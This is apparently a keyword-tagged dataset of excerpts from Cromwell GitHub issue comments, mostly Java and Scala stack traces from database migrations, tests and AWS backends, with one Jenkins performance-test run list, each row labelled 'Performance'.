Performance,"base.changelog.ChangeLogIterator.run(ChangeLogIterator.java:79); 	at liquibase.Liquibase.update(Liquibase.java:214); 	at liquibase.Liquibase.update(Liquibase.java:192); 	at cromwell.database.migration.liquibase.LiquibaseUtils$.updateSchema(LiquibaseUtils.scala:62); 	at cromwell.database.migration.liquibase.LiquibaseUtils$.updateSchema(LiquibaseUtils.scala:34); 	at cromwell.services.ServicesStore$EnhancedSqlDatabase$.$anonfun$initialized$1(ServicesStore.scala:11); 	at cromwell.services.ServicesStore$EnhancedSqlDatabase$.$anonfun$initialized$1$adapted(ServicesStore.scala:11); 	at cromwell.database.slick.SlickDatabase.$anonfun$withConnection$1(SlickDatabase.scala:155); 	at slick.jdbc.SimpleJdbcAction.run(StreamingInvokerAction.scala:70); 	at slick.jdbc.SimpleJdbcAction.run(StreamingInvokerAction.scala:69); 	at slick.basic.BasicBackend$DatabaseDef$$anon$2.liftedTree1$1(BasicBackend.scala:275); 	at slick.basic.BasicBackend$DatabaseDef$$anon$2.run(BasicBackend.scala:275); 	at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1149); 	at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:624); 	at java.lang.Thread.run(Thread.java:748); Caused by: liquibase.exception.DatabaseException: Unknown column '%failures%causedBy:%' in 'where clause' [Failed SQL: UPDATE METADATA_ENTRY; SET METADATA_KEY = REPLACE(METADATA_KEY, ""causedBy:"", ""causedBy[0]:""); WHERE METADATA_KEY LIKE ""%failures%causedBy:%""]; 	at liquibase.executor.jvm.JdbcExecutor$ExecuteStatementCallback.doInStatement(JdbcExecutor.java:309); 	at liquibase.executor.jvm.JdbcExecutor.execute(JdbcExecutor.java:55); 	at liquibase.executor.jvm.JdbcExecutor.execute(JdbcExecutor.java:113); 	at liquibase.database.AbstractJdbcDatabase.execute(AbstractJdbcDatabase.java:1277); 	at liquibase.database.AbstractJdbcDatabase.executeStatements(AbstractJdbcDatabase.java:1259); 	at liquibase.changelog.ChangeSet.execute(ChangeSet.java:582); 	... 16 common frames omitted; Caused by: com.mysql.jdbc",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4606#issuecomment-459583809:2410,concurren,concurrent,2410,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4606#issuecomment-459583809,1,['concurren'],['concurrent']
Performance,"base.changelog.ChangeLogIterator.run(ChangeLogIterator.java:79); 	at liquibase.Liquibase.update(Liquibase.java:214); 	at liquibase.Liquibase.update(Liquibase.java:192); 	at cromwell.database.migration.liquibase.LiquibaseUtils$.updateSchema(LiquibaseUtils.scala:62); 	at cromwell.database.migration.liquibase.LiquibaseUtils$.updateSchema(LiquibaseUtils.scala:34); 	at cromwell.services.ServicesStore$EnhancedSqlDatabase$.$anonfun$initialized$1(ServicesStore.scala:11); 	at cromwell.services.ServicesStore$EnhancedSqlDatabase$.$anonfun$initialized$1$adapted(ServicesStore.scala:11); 	at cromwell.database.slick.SlickDatabase.$anonfun$withConnection$1(SlickDatabase.scala:155); 	at slick.jdbc.SimpleJdbcAction.run(StreamingInvokerAction.scala:70); 	at slick.jdbc.SimpleJdbcAction.run(StreamingInvokerAction.scala:69); 	at slick.basic.BasicBackend$DatabaseDef$$anon$2.liftedTree1$1(BasicBackend.scala:275); 	at slick.basic.BasicBackend$DatabaseDef$$anon$2.run(BasicBackend.scala:275); 	at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1149); 	at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:624); 	at java.lang.Thread.run(Thread.java:748); Caused by: liquibase.exception.DatabaseException: Unknown column '%failures[%]%:failure' in 'where clause' [Failed SQL: UPDATE METADATA_ENTRY; SET METADATA_KEY = CONCAT(TRIM(TRAILING ':failure' FROM METADATA_KEY), "":message""); WHERE METADATA_KEY LIKE ""%failures[%]%:failure""]; 	at liquibase.executor.jvm.JdbcExecutor$ExecuteStatementCallback.doInStatement(JdbcExecutor.java:309); 	at liquibase.executor.jvm.JdbcExecutor.execute(JdbcExecutor.java:55); 	at liquibase.executor.jvm.JdbcExecutor.execute(JdbcExecutor.java:113); 	at liquibase.database.AbstractJdbcDatabase.execute(AbstractJdbcDatabase.java:1277); 	at liquibase.database.AbstractJdbcDatabase.executeStatements(AbstractJdbcDatabase.java:1259); 	at liquibase.changelog.ChangeSet.execute(ChangeSet.java:582); 	... 16 common frames omitted; Caused by:",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4606#issuecomment-459580103:2486,concurren,concurrent,2486,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4606#issuecomment-459580103,1,['concurren'],['concurrent']
Performance,"base.changelog.ChangeLogIterator.run(ChangeLogIterator.java:79); 	at liquibase.Liquibase.update(Liquibase.java:214); 	at liquibase.Liquibase.update(Liquibase.java:192); 	at cromwell.database.migration.liquibase.LiquibaseUtils$.updateSchema(LiquibaseUtils.scala:62); 	at cromwell.database.migration.liquibase.LiquibaseUtils$.updateSchema(LiquibaseUtils.scala:34); 	at cromwell.services.ServicesStore$EnhancedSqlDatabase$.$anonfun$initialized$1(ServicesStore.scala:11); 	at cromwell.services.ServicesStore$EnhancedSqlDatabase$.$anonfun$initialized$1$adapted(ServicesStore.scala:11); 	at cromwell.database.slick.SlickDatabase.$anonfun$withConnection$1(SlickDatabase.scala:155); 	at slick.jdbc.SimpleJdbcAction.run(StreamingInvokerAction.scala:70); 	at slick.jdbc.SimpleJdbcAction.run(StreamingInvokerAction.scala:69); 	at slick.basic.BasicBackend$DatabaseDef$$anon$2.liftedTree1$1(BasicBackend.scala:275); 	at slick.basic.BasicBackend$DatabaseDef$$anon$2.run(BasicBackend.scala:275); 	at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1149); 	at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:624); 	at java.lang.Thread.run(Thread.java:748); Caused by: liquibase.exception.DatabaseException: Unknown column ':causedBy[]' in 'field list' [Failed SQL: INSERT INTO METADATA_ENTRY (WORKFLOW_EXECUTION_UUID, METADATA_KEY, CALL_FQN, JOB_SCATTER_INDEX, JOB_RETRY_ATTEMPT, METADATA_TIMESTAMP); SELECT t1.WORKFLOW_EXECUTION_UUID, CONCAT(TRIM(TRAILING ':message' FROM t1.METADATA_KEY), "":causedBy[]""), t1.CALL_FQN, t1.JOB_SCATTER_INDEX, t1.JOB_RETRY_ATTEMPT, t1.METADATA_TIMESTAMP; FROM METADATA_ENTRY AS t1; WHERE METADATA_KEY LIKE '%failures[%]%:message'; AND NOT EXISTS (SELECT *; 	FROM METADATA_ENTRY AS t2; 	WHERE t2.WORKFLOW_EXECUTION_UUID = t1.WORKFLOW_EXECUTION_UUID; 	 AND (t2.CALL_FQN = t1.CALL_FQN OR (t2.CALL_FQN IS NULL AND t1.CALL_FQN IS NULL)); 	 AND (t2.JOB_SCATTER_INDEX = t1.JOB_SCATTER_INDEX OR (t2.JOB_SCATTER_INDEX IS NULL AND t1.JOB_SCAT",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4606#issuecomment-459609701:4133,concurren,concurrent,4133,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4606#issuecomment-459609701,1,['concurren'],['concurrent']
Performance,bstractPartialFunction.apply(AbstractPartialFunction.scala:36); 	at scala.util.Failure.recoverWith(Try.scala:203); 	at cromwell.engine.workflow.lifecycle.execution.CallPreparationActor.resolveAndEvaluateInputs(JobPreparationActor.scala:48); 	at cromwell.engine.workflow.lifecycle.execution.CallPreparationActor$$anonfun$receive$1.applyOrElse(JobPreparationActor.scala:27); 	at akka.actor.Actor$class.aroundReceive(Actor.scala:484); 	at cromwell.engine.workflow.lifecycle.execution.CallPreparationActor.aroundReceive(JobPreparationActor.scala:18); 	at akka.actor.ActorCell.receiveMessage(ActorCell.scala:526); 	at akka.actor.ActorCell.invoke(ActorCell.scala:495); 	at akka.dispatch.Mailbox.processMailbox(Mailbox.scala:257); 	at akka.dispatch.Mailbox.run(Mailbox.scala:224); 	at akka.dispatch.Mailbox.exec(Mailbox.scala:234); 	at scala.concurrent.forkjoin.ForkJoinTask.doExec(ForkJoinTask.java:260); 	at scala.concurrent.forkjoin.ForkJoinPool$WorkQueue.runTask(ForkJoinPool.java:1339); 	at scala.concurrent.forkjoin.ForkJoinPool.runWorker(ForkJoinPool.java:1979); 	at scala.concurrent.forkjoin.ForkJoinWorkerThread.run(ForkJoinWorkerThread.java:107); 	Suppressed: wdl4s.exception.ValidationException: Input evaluation for Call dna_mapping_38.libraryMerge failed.:; inputBams:; 	Could not find the shard mapping to this scatter dna_mapping_38.$scatter_1; outputBam:; 	Could not find the shard mapping to this scatter dna_mapping_38.$scatter_1; 		at wdl4s.Call.evaluateTaskInputs(Call.scala:117); 		at cromwell.engine.workflow.lifecycle.execution.CallPreparationActor$$anonfun$resolveAndEvaluateInputs$2.apply(JobPreparationActor.scala:42); 		at cromwell.engine.workflow.lifecycle.execution.CallPreparationActor$$anonfun$resolveAndEvaluateInputs$2.apply(JobPreparationActor.scala:35); 		at scala.util.Try$.apply(Try.scala:192); 		at cromwell.engine.workflow.lifecycle.execution.CallPreparationActor.resolveAndEvaluateInputs(JobPreparationActor.scala:35); 		... 12 more; 		Suppressed: wdl4s.exception.Vari,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1802#issuecomment-268422512:4273,concurren,concurrent,4273,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1802#issuecomment-268422512,1,['concurren'],['concurrent']
Performance,"c-jenkins.dsp-techops.broadinstitute.org/job/PerformanceTest-against-Alpha/989/ (3 total failed workflows, 50 min); https://fc-jenkins.dsp-techops.broadinstitute.org/job/PerformanceTest-against-Alpha/997/ (1 total failed workflows, 50 min); https://fc-jenkins.dsp-techops.broadinstitute.org/job/PerformanceTest-against-Alpha/998/ (1 total failed workflows, 50 min); https://fc-jenkins.dsp-techops.broadinstitute.org/job/PerformanceTest-against-Alpha/999/ (1 total failed workflows, 49 min); https://fc-jenkins.dsp-techops.broadinstitute.org/job/PerformanceTest-against-Alpha/1000/ (0 total failed workflows, 52 min); https://fc-jenkins.dsp-techops.broadinstitute.org/job/PerformanceTest-against-Alpha/1001/ (0 total failed workflows, 51 min). **After:**. Mean = 0.5, stdev = 0.5. https://fc-jenkins.dsp-techops.broadinstitute.org/job/PerformanceTest-against-Alpha/985/ (0 total failed workflows, 53 min); https://fc-jenkins.dsp-techops.broadinstitute.org/job/PerformanceTest-against-Alpha/986/ (0 total failed workflows, 51 min); https://fc-jenkins.dsp-techops.broadinstitute.org/job/PerformanceTest-against-Alpha/987/ (1 total failed workflows, 51 min); https://fc-jenkins.dsp-techops.broadinstitute.org/job/PerformanceTest-against-Alpha/990/ (1 total failed workflows, 51 min); https://fc-jenkins.dsp-techops.broadinstitute.org/job/PerformanceTest-against-Alpha/991/ (1 total failed workflows, 50 min); https://fc-jenkins.dsp-techops.broadinstitute.org/job/PerformanceTest-against-Alpha/992/ (0 total failed workflows, 50 min); https://fc-jenkins.dsp-techops.broadinstitute.org/job/PerformanceTest-against-Alpha/993/ (1 total failed workflows, 52 min); https://fc-jenkins.dsp-techops.broadinstitute.org/job/PerformanceTest-against-Alpha/994/ (0 total failed workflows, 53 min); https://fc-jenkins.dsp-techops.broadinstitute.org/job/PerformanceTest-against-Alpha/995/ (1 total failed workflows, 50 min); https://fc-jenkins.dsp-techops.broadinstitute.org/job/PerformanceTest-against-Alpha/996/ (0 tot",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/5906#issuecomment-712950526:1550,Perform,PerformanceTest-against-Alpha,1550,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/5906#issuecomment-712950526,1,['Perform'],['PerformanceTest-against-Alpha']
Performance,"c178-1d7e-4fbc-94bd-7fc147e5ccfb-EngineJobExecutionActor-GATK4_WGS_ALL_IN_ONE.N_SamToFastqAndBwaMem:0:1 [UUID(0123c178)]: Could not copy a suitable cache hit for 0123c178:GATK4_WGS_ALL_IN_ONE.N_SamToFastqAndBwaMem:0:1. EJEA attempted to copy 1 cache hits before failing. Of these 1 failed to copy and 0 were already blacklisted from previous attempts). Falling back to running job. As you can see, some small tasks worked but large tasks failed. > Hi, In Cromwell 52 we updated the S3 module to perform multithreaded, multipart copies to improve the size of results that may be cached. There are also additional improvements that have recently been merged into dev and should appear in the next release version (or you could build from source) v52+ requires a new AWS configuration. Instructions are in https://aws-genomics-workflows.s3.amazonaws.com/Installing+the+Genomics+Workflow+Core+and+Cromwell.pdf; > […](#); > On Sat, Oct 24, 2020 at 8:27 PM Luyu ***@***.***> wrote: Hi, I got a timeout exception during cache copying on AWS S3. The cache file size is 133GB. Given the file size, more time should be allowed for cache copying. Is there any config option that can tune this? Thank you in advance for any suggestions. Backend: AWS Batch Cromwell version: 51 Error log: Failure copying cache results for job BackendJobDescriptorKey_CommandCallNode_PreProcessingForVariantDiscovery_GATK4.SamTo FastqAndBwaMem:0:1 (TimeoutException: The Cache hit copying actor timed out waiting for a response to copy s3://xxxxx/cromwell-execution/Germ line_Somatic_Calling/441619a4-7ca8-490b-bd04-2f9981d3db0f/call-Tumor_Bam/PreProcessingForVariantDiscovery_GATK4/95aed08f-3045-45e4-94c9-ba0230851136 /call-SamToFastqAndBwaMem/shard-0/39T_R.unmerged.bam to s3://xxxxx/cromwell-execution/Germline_Somatic_Calling/c25a8561-808f-4b46-9bd2-ef0488 8c0031/call-Tumor_Bam/PreProcessingForVariantDiscovery_GATK4/8df24f46-2f4f-4557-a662-d630ac443736/call-SamToFastqAndBwaMem/shard-0/cacheCopy/39T_R.u nmerged.bam) — You a",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/5977#issuecomment-723478807:2659,cache,cache,2659,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/5977#issuecomment-723478807,1,['cache'],['cache']
Performance,cala.collection.AbstractTraversable.flatMap(Traversable.scala:108); 	at cromwell.backend.impl.aws.OccasionalStatusPollingActor.$anonfun$updateStatuses$4(OccasionalStatusPollingActor.scala:103); 	at scala.runtime.java8.JFunction0$mcV$sp.apply(JFunction0$mcV$sp.java:23); 	at scala.util.Try$.apply(Try.scala:213); 	at cromwell.backend.impl.aws.OccasionalStatusPollingActor.updateForStatusNames$1(OccasionalStatusPollingActor.scala:101); 	at cromwell.backend.impl.aws.OccasionalStatusPollingActor.cromwell$backend$impl$aws$OccasionalStatusPollingActor$$updateStatuses(OccasionalStatusPollingActor.scala:118); 	at cromwell.backend.impl.aws.OccasionalStatusPollingActor$$anonfun$receive$1.$anonfun$applyOrElse$1(OccasionalStatusPollingActor.scala:57); 	at scala.runtime.java8.JFunction0$mcV$sp.apply(JFunction0$mcV$sp.java:23); 	at scala.concurrent.Future$.$anonfun$apply$1(Future.scala:659); 	at scala.util.Success.$anonfun$map$1(Try.scala:255); 	at scala.util.Success.map(Try.scala:213); 	at scala.concurrent.Future.$anonfun$map$1(Future.scala:292); 	at scala.concurrent.impl.Promise.liftedTree1$1(Promise.scala:33); 	at scala.concurrent.impl.Promise.$anonfun$transform$1(Promise.scala:33); 	at scala.concurrent.impl.CallbackRunnable.run(Promise.scala:64); 	at akka.dispatch.BatchingExecutor$AbstractBatch.processBatch(BatchingExecutor.scala:55); 	at akka.dispatch.BatchingExecutor$BlockableBatch.$anonfun$run$1(BatchingExecutor.scala:92); 	at scala.runtime.java8.JFunction0$mcV$sp.apply(JFunction0$mcV$sp.java:23); 	at scala.concurrent.BlockContext$.withBlockContext(BlockContext.scala:85); 	at akka.dispatch.BatchingExecutor$BlockableBatch.run(BatchingExecutor.scala:92); 	at akka.dispatch.TaskInvocation.run(AbstractDispatcher.scala:41); 	at akka.dispatch.ForkJoinExecutorConfigurator$AkkaForkJoinTask.exec(ForkJoinExecutorConfigurator.scala:49); 	at akka.dispatch.forkjoin.ForkJoinTask.doExec(ForkJoinTask.java:260); 	at akka.dispatch.forkjoin.ForkJoinPool$WorkQueue.runTask(ForkJoinPool.java:1339); ,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/5162#issuecomment-540113119:6259,concurren,concurrent,6259,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/5162#issuecomment-540113119,2,['concurren'],['concurrent']
Performance,"cala:124) ~[cromwell.jar:0.19]; at scala.collection.immutable.List.foldLeft(List.scala:84) ~[cromwell.jar:0.19]; at cromwell.engine.backend.jes.JesBackend.postProcess(JesBackend.scala:665) ~[cromwell.jar:0.19]; at cromwell.engine.backend.jes.JesBackend$$anonfun$executionResult$1.apply(JesBackend.scala:705) ~[cromwell.jar:0.19]; at cromwell.engine.backend.jes.JesBackend$$anonfun$executionResult$1.apply(JesBackend.scala:705) ~[cromwell.jar:0.19]; at cromwell.engine.backend.jes.JesBackend$$anonfun$executionResult$1.apply(JesBackend.scala:700) ~[cromwell.jar:0.19]; at scala.concurrent.impl.Future$PromiseCompletingRunnable.liftedTree1$1(Future.scala:24) ~[cromwell.jar:0.19]; at scala.concurrent.impl.Future$PromiseCompletingRunnable.run(Future.scala:24) ~[cromwell.jar:0.19]; at akka.dispatch.TaskInvocation.run(AbstractDispatcher.scala:40) ~[cromwell.jar:0.19]; at akka.dispatch.ForkJoinExecutorConfigurator$AkkaForkJoinTask.exec(AbstractDispatcher.scala:397) [cromwell.jar:0.19]; at scala.concurrent.forkjoin.ForkJoinTask.doExec(ForkJoinTask.java:260) [cromwell.jar:0.19]; at scala.concurrent.forkjoin.ForkJoinPool$WorkQueue.runTask(ForkJoinPool.java:1339) [cromwell.jar:0.19]; at scala.concurrent.forkjoin.ForkJoinPool.runWorker(ForkJoinPool.java:1979) [cromwell.jar:0.19]; at scala.concurrent.forkjoin.ForkJoinWorkerThread.run(ForkJoinWorkerThread.java:107) [cromwell.jar:0.19]; Caused by: java.io.EOFException: SSL peer shut down incorrectly; at sun.security.ssl.InputRecord.read(InputRecord.java:505) ~[na:1.8.0_72]; at sun.security.ssl.SSLSocketImpl.readRecord(SSLSocketImpl.java:973) ~[na:1.8.0_72]; ... 54 common frames omitted; ```. and. ```; 2016-08-03 03:33:06,985 cromwell-system-akka.actor.default-dispatcher-3 WARN - Caught exception, retrying: Broken pipe; java.net.SocketException: Broken pipe; at java.net.SocketOutputStream.socketWrite0(Native Method) ~[na:1.8.0_72]; at java.net.SocketOutputStream.socketWrite(SocketOutputStream.java:109) ~[na:1.8.0_72]; at java.net.SocketOutp",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1248#issuecomment-237583201:6306,concurren,concurrent,6306,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1248#issuecomment-237583201,1,['concurren'],['concurrent']
Performance,cala:246); at sbt.TestFramework$$anon$2$$anonfun$$lessinit$greater$1.apply(TestFramework.scala:282); at sbt.TestFramework$$anon$2$$anonfun$$lessinit$greater$1.apply(TestFramework.scala:282); at sbt.TestFunction.apply(TestFramework.scala:294); at sbt.Tests$.processRunnable$1(Tests.scala:347); at sbt.Tests$.$anonfun$makeSerial$1(Tests.scala:353); at sbt.std.Transform$$anon$3.$anonfun$apply$2(System.scala:46); at sbt.std.Transform$$anon$4.work(System.scala:67); at sbt.Execute.$anonfun$submit$2(Execute.scala:269); at sbt.internal.util.ErrorHandling$.wideConvert(ErrorHandling.scala:16); at sbt.Execute.work(Execute.scala:278); at sbt.Execute.$anonfun$submit$1(Execute.scala:269); at sbt.ConcurrentRestrictions$$anon$4.$anonfun$submitValid$1(ConcurrentRestrictions.scala:178); at sbt.CompletionService$$anon$2.call(CompletionService.scala:37); at java.util.concurrent.FutureTask.run(FutureTask.java:266); at java.util.concurrent.Executors$RunnableAdapter.call(Executors.java:511); at java.util.concurrent.FutureTask.run(FutureTask.java:266); at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1149); at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:624); at java.lang.Thread.run(Thread.java:748); Cause: org.scalatest.exceptions.TestFailedException: Submitted did not equal Failed; at org.scalatest.MatchersHelper$.indicateFailure(MatchersHelper.scala:346); at org.scalatest.Matchers$ShouldMethodHelper$.shouldMatcher(Matchers.scala:6668); at org.scalatest.Matchers$AnyShouldWrapper.should(Matchers.scala:6716); at cromwell.CromwellTestKitSpec.verifyWorkflowState(CromwellTestKitSpec.scala:377); at cromwell.CromwellTestKitSpec.$anonfun$runWdl$1(CromwellTestKitSpec.scala:323); at scala.runtime.java8.JFunction0$mcV$sp.apply(JFunction0$mcV$sp.java:12); at org.scalatest.concurrent.Eventually.makeAValiantAttempt$1(Eventually.scala:395); at org.scalatest.concurrent.Eventually.tryTryAgain$1(Eventually.scala:409); at org.scalatest.concurrent.Even,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4521#issuecomment-453539593:4832,concurren,concurrent,4832,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4521#issuecomment-453539593,2,['concurren'],['concurrent']
Performance,"cala:246); at sbt.TestFramework$$anon$2$$anonfun$$lessinit$greater$1.apply(TestFramework.scala:282); at sbt.TestFramework$$anon$2$$anonfun$$lessinit$greater$1.apply(TestFramework.scala:282); at sbt.TestFunction.apply(TestFramework.scala:294); at sbt.Tests$.processRunnable$1(Tests.scala:347); at sbt.Tests$.$anonfun$makeSerial$1(Tests.scala:353); at sbt.std.Transform$$anon$3.$anonfun$apply$2(System.scala:46); at sbt.std.Transform$$anon$4.work(System.scala:67); at sbt.Execute.$anonfun$submit$2(Execute.scala:269); at sbt.internal.util.ErrorHandling$.wideConvert(ErrorHandling.scala:16); at sbt.Execute.work(Execute.scala:278); at sbt.Execute.$anonfun$submit$1(Execute.scala:269); at sbt.ConcurrentRestrictions$$anon$4.$anonfun$submitValid$1(ConcurrentRestrictions.scala:178); at sbt.CompletionService$$anon$2.call(CompletionService.scala:37); at java.util.concurrent.FutureTask.run(FutureTask.java:266); at java.util.concurrent.Executors$RunnableAdapter.call(Executors.java:511); at java.util.concurrent.FutureTask.run(FutureTask.java:266); at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1149); at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:624); at java.lang.Thread.run(Thread.java:748); Cause: org.scalatest.exceptions.TestFailedException: isEmpty was false, and Some(false) did not contain true Instead, a.status.messages = List(Unknown status) and e.status.messages = List(womp womp); at org.scalatest.Assertions.newAssertionFailedException(Assertions.scala:528); at org.scalatest.Assertions.newAssertionFailedException$(Assertions.scala:527); at cromwell.core.TestKitSuite.newAssertionFailedException(TestKitSuite.scala:16); at org.scalatest.Assertions$AssertionsHelper.macroAssert(Assertions.scala:501); at cromwell.services.healthmonitor.HealthMonitorServiceActorSpec.$anonfun$eventualStatus$5(HealthMonitorServiceActorSpec.scala:48); at scala.collection.immutable.List.map(List.scala:283); at cromwell.services.healthmonitor.Heal",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4259#issuecomment-433056382:5558,concurren,concurrent,5558,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4259#issuecomment-433056382,1,['concurren'],['concurrent']
Performance,cala:97); 	at scala.collection.TraversableLike.flatMap(TraversableLike.scala:245); 	at scala.collection.TraversableLike.flatMap$(TraversableLike.scala:242); 	at scala.collection.AbstractTraversable.flatMap(Traversable.scala:108); 	at cromwell.backend.impl.aws.OccasionalStatusPollingActor.$anonfun$updateStatuses$4(OccasionalStatusPollingActor.scala:103); 	at scala.runtime.java8.JFunction0$mcV$sp.apply(JFunction0$mcV$sp.java:23); 	at scala.util.Try$.apply(Try.scala:213); 	at cromwell.backend.impl.aws.OccasionalStatusPollingActor.updateForStatusNames$1(OccasionalStatusPollingActor.scala:101); 	at cromwell.backend.impl.aws.OccasionalStatusPollingActor.cromwell$backend$impl$aws$OccasionalStatusPollingActor$$updateStatuses(OccasionalStatusPollingActor.scala:118); 	at cromwell.backend.impl.aws.OccasionalStatusPollingActor$$anonfun$receive$1.$anonfun$applyOrElse$1(OccasionalStatusPollingActor.scala:57); 	at scala.runtime.java8.JFunction0$mcV$sp.apply(JFunction0$mcV$sp.java:23); 	at scala.concurrent.Future$.$anonfun$apply$1(Future.scala:659); 	at scala.util.Success.$anonfun$map$1(Try.scala:255); 	at scala.util.Success.map(Try.scala:213); 	at scala.concurrent.Future.$anonfun$map$1(Future.scala:292); 	at scala.concurrent.impl.Promise.liftedTree1$1(Promise.scala:33); 	at scala.concurrent.impl.Promise.$anonfun$transform$1(Promise.scala:33); 	at scala.concurrent.impl.CallbackRunnable.run(Promise.scala:64); 	at akka.dispatch.BatchingExecutor$AbstractBatch.processBatch(BatchingExecutor.scala:55); 	at akka.dispatch.BatchingExecutor$BlockableBatch.$anonfun$run$1(BatchingExecutor.scala:92); 	at scala.runtime.java8.JFunction0$mcV$sp.apply(JFunction0$mcV$sp.java:23); 	at scala.concurrent.BlockContext$.withBlockContext(BlockContext.scala:85); 	at akka.dispatch.BatchingExecutor$BlockableBatch.run(BatchingExecutor.scala:92); 	at akka.dispatch.TaskInvocation.run(AbstractDispatcher.scala:41); 	at akka.dispatch.ForkJoinExecutorConfigurator$AkkaForkJoinTask.exec(ForkJoinExecutorConfigurator.sca,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/5162#issuecomment-540113119:6097,concurren,concurrent,6097,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/5162#issuecomment-540113119,2,['concurren'],['concurrent']
Performance,ce.scala:37); at java.util.concurrent.FutureTask.run(FutureTask.java:266); at java.util.concurrent.Executors$RunnableAdapter.call(Executors.java:511); at java.util.concurrent.FutureTask.run(FutureTask.java:266); at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1149); at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:624); at java.lang.Thread.run(Thread.java:748); Cause: org.scalatest.exceptions.TestFailedException: Submitted did not equal Failed; at org.scalatest.MatchersHelper$.indicateFailure(MatchersHelper.scala:346); at org.scalatest.Matchers$ShouldMethodHelper$.shouldMatcher(Matchers.scala:6668); at org.scalatest.Matchers$AnyShouldWrapper.should(Matchers.scala:6716); at cromwell.CromwellTestKitSpec.verifyWorkflowState(CromwellTestKitSpec.scala:377); at cromwell.CromwellTestKitSpec.$anonfun$runWdl$1(CromwellTestKitSpec.scala:323); at scala.runtime.java8.JFunction0$mcV$sp.apply(JFunction0$mcV$sp.java:12); at org.scalatest.concurrent.Eventually.makeAValiantAttempt$1(Eventually.scala:395); at org.scalatest.concurrent.Eventually.tryTryAgain$1(Eventually.scala:409); at org.scalatest.concurrent.Eventually.eventually(Eventually.scala:439); at org.scalatest.concurrent.Eventually.eventually$(Eventually.scala:391); at cromwell.CromwellTestKitSpec.eventually(CromwellTestKitSpec.scala:251); at cromwell.CromwellTestKitSpec.runWdl(CromwellTestKitSpec.scala:323); at cromwell.WorkflowFailSlowSpec.$anonfun$new$2(WorkflowFailSlowSpec.scala:18); at org.scalatest.OutcomeOf.outcomeOf(OutcomeOf.scala:85); at org.scalatest.OutcomeOf.outcomeOf$(OutcomeOf.scala:83); at org.scalatest.OutcomeOf$.outcomeOf(OutcomeOf.scala:104); at org.scalatest.Transformer.apply(Transformer.scala:22); at org.scalatest.Transformer.apply(Transformer.scala:20); at org.scalatest.WordSpecLike$$anon$1.apply(WordSpecLike.scala:1078); at org.scalatest.TestSuite.withFixture(TestSuite.scala:196); at org.scalatest.TestSuite.withFixture$(TestSuite.scala:195); at c,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4521#issuecomment-453539593:5663,concurren,concurrent,5663,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4521#issuecomment-453539593,1,['concurren'],['concurrent']
Performance,ce.scala:37); at java.util.concurrent.FutureTask.run(FutureTask.java:266); at java.util.concurrent.Executors$RunnableAdapter.call(Executors.java:511); at java.util.concurrent.FutureTask.run(FutureTask.java:266); at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1149); at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:624); at java.lang.Thread.run(Thread.java:748); Cause: org.scalatest.exceptions.TestFailedException: Submitted did not equal Failed; at org.scalatest.MatchersHelper$.indicateFailure(MatchersHelper.scala:346); at org.scalatest.Matchers$ShouldMethodHelper$.shouldMatcher(Matchers.scala:6668); at org.scalatest.Matchers$AnyShouldWrapper.should(Matchers.scala:6716); at cromwell.CromwellTestKitSpec.verifyWorkflowState(CromwellTestKitSpec.scala:377); at cromwell.CromwellTestKitSpec.$anonfun$runWdl$1(CromwellTestKitSpec.scala:323); at scala.runtime.java8.JFunction0$mcV$sp.apply(JFunction0$mcV$sp.java:12); at org.scalatest.concurrent.Eventually.makeAValiantAttempt$1(Eventually.scala:395); at 